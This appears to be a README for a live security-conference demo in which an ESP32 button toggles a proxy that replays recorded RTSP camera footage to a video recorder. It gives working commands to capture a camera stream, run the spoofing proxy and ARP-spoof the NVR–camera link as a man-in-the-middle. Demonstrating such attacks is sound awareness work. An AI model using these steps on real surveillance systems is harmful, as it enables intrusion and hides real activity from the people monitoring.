# Trigger — CLI + ESP32 button for the live demo

Tiny command-line tool that flips the RTSPoofing proxy on and off from
one place, plus a serial bridge and an ESP32 sketch so a bystander at
a congress can press a button and watch the camera feed change.

```
   ┌─ ESP32 button ─┐   USB-serial   ┌─ trigger-serial.sh ─┐    exec    ┌─ rtspoof-ctl ─┐
   │  GPIO 32 → "spoof"  ─────────▶  │  reads /dev/ttyACM0 │  ────────▶ │  spawn proxy  │
   │  GPIO 33 → "normal" ─────────▶  │  dispatches CLI     │  ────────▶ │  kill proxy   │
   └────────────────┘                └─────────────────────┘            └───────────────┘
```

The CLI is deliberately boring. One subcommand per state, a PID file in
`/tmp`, a config file next to it. Each call is a one-shot: no daemon,
no web UI, nothing to leave running between presses.

## Pieces

| File | What it is |
|---|---|
| `rtspoof-ctl`        | Python CLI. Subcommands: `spoof`, `normal`, `toggle`, `status`, `logs`. |
| `config.example.ini` | Presaved proxy flags — copy to `config.ini` and edit. |
| `trigger-serial.sh`  | Zero-dependency bash watcher; reads lines from a serial port and runs the CLI. |
| `esp32/button.ino`   | Minimal Arduino sketch for an ESP32 with two pushbuttons. |

## Setup

### 1. Build the proxy (once)

```bash
cd RE
cargo build --release
```

### 2. Record a `.rtp` to replay

The spoof needs a capture file. Do a one-off recording with the proxy
directly (not via `rtspoof-ctl` — that's for the inject state only):

```bash
sudo ./RE/target/release/rtspoofing \
    --mode record \
    --camera-host 192.168.1.108 \
    --capture-file captured.rtp
# let it run for ~10s, then Ctrl-C.
```

### 3. Configure the CLI

```bash
cd Trigger
cp config.example.ini config.ini
$EDITOR config.ini          # set camera_host, listen_port, capture_file
chmod +x rtspoof-ctl trigger-serial.sh
```

### 4. Smoke-test from the shell

```bash
sudo ./rtspoof-ctl status      # → state: normal (proxy not running)
sudo ./rtspoof-ctl spoof       # → spoofing · pid=... · log=/tmp/rtspoof-ctl.log
sudo ./rtspoof-ctl status      # → state: spoofing · pid=... · up 2s
sudo ./rtspoof-ctl logs -f     # watch what the proxy is doing
sudo ./rtspoof-ctl normal      # → stopped (pid=...)
```

`sudo` because the proxy binds port 554 and (usually) does ARP-adjacent
work. If you've `setcap`'d the binary you can run as yourself; the pid
file in `/tmp` works for either.

### 5. (Optional) ARP spoofing

The proxy only intercepts what already lands on this host. For the full
NVR→camera MITM you still need `arpspoof` running from a separate
terminal — the usual pair of commands:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t <NVR_IP> <CAMERA_IP>  &
sudo arpspoof -i eth0 -t <CAMERA_IP> <NVR_IP>  &
```

These stay up for the whole demo. The ESP32 button only toggles the
inject proxy — not the ARP side.

## The ESP32 side

### Wiring

Two momentary pushbuttons to ground, no external resistors (the sketch
enables internal pull-ups):

```
    GPIO 32 ──[ button ]── GND          // "spoof"
    GPIO 33 ──[ button ]── GND          // "normal"
```

Any ESP32 dev board with USB-serial works. If yours uses a CP2102 or
CH340 bridge, your port will be `/dev/ttyUSB0` instead of
`/dev/ttyACM0` — pass the right one to the serial bridge.

### Flash the sketch

Open `esp32/button.ino` in the Arduino IDE (or `arduino-cli`), pick
your ESP32 board, and upload. The sketch sends one lowercase word per
press over the USB-serial at 9600 bps.

### Run the bridge on the host

```bash
cd Trigger
sudo ./trigger-serial.sh /dev/ttyACM0 9600
```

That's it. The bridge sits in the foreground, prints each dispatched
command, and exits cleanly on Ctrl-C. If you want it to survive
logout, drop it into a systemd unit — or just `tmux`.

### Testing the bridge without an ESP32

If the hardware hasn't arrived yet, `socat` can hand you a pair of
virtual serial ports — one for the bridge to listen on, one for you
to type into (simulating button presses):

```bash
# terminal A — make a virtual pty pair
socat -d -d pty,raw,echo=0 pty,raw,echo=0
# prints two paths, e.g.:
#   PTY is /dev/pts/5
#   PTY is /dev/pts/6
# leave this running

# terminal B — point the bridge at one end
sudo ./trigger-serial.sh /dev/pts/5 9600

# terminal C — pretend to be the ESP32
printf 'spoof\n'  > /dev/pts/6
printf 'normal\n' > /dev/pts/6
printf 'toggle\n' > /dev/pts/6
```

Each `printf` lands as one "button press" and the bridge prints
`> spoof` / `> normal` / `> toggle` as it dispatches. When the real
ESP32 shows up, replace `/dev/pts/5` with `/dev/ttyACM0` and the
rest of the setup is identical — the sketch sends those exact
lines.

### One-button variant

If you only have one button on the panel, wire it to GPIO 32 and
change the sketch's `Serial.println("spoof")` to
`Serial.println("toggle")`. Each press then flips whichever state the
proxy is in.

## Why not just a hotkey?

A keybinding depends on the laptop running `trigger-serial.sh`'s
desktop having focus on the right window. The USB-serial path works
without a window manager at all, which is the whole point for a kiosk
demo.

## Troubleshooting

- `rtspoof-ctl spoof` says the proxy exited immediately — look at
  `/tmp/rtspoof-ctl.log`; usually it's "port already bound" (another
  proxy is still running) or "capture file not found".
- `rtspoof-ctl status` says "normal" after a kill -9 — the stale
  pid file gets cleared automatically on the next call. Just run
  `spoof` again.
- `trigger-serial.sh` reports "serial device not found" — unplug and
  replug the ESP32, then `ls /dev/ttyACM* /dev/ttyUSB*` to find its
  new path and pass it as the first argument.
- Nothing happens when you press the button but the serial device is
  there — add a `cat` test: `sudo cat /dev/ttyACM0` and press the
  button. If no `spoof`/`normal` lines appear, re-flash the sketch
  (the ESP32 occasionally boots into bootloader mode).
